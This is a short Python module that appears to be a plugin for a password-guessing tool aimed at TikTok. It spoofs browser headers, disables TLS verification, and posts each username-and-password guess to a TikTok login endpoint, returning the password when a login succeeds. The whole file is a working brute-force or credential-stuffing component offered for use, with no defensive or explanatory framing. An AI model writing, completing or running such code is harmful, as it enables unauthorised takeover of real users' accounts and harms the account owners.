import requests, urllib3
urllib3.disable_warnings()
class Platform:
    name = "TikTok"; emoji = "🎵"; color = "cyan"
    def setup(self):
        self.s = requests.Session()
        self.s.headers.update({"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36","Referer":"https://www.tiktok.com/login"})
    def attempt(self, u, p):
        try:
            r = self.s.post("https://www.tiktok.com/api/v1/auth/login/", data={"username":u,"password":p,"service":"https://www.tiktok.com/"}, verify=False, timeout=10)
            j = r.json()
            if j.get("data",{}).get("user_id"): return {"success":True,"password":p}
            return {"success":False}
        except: return {"success":False}
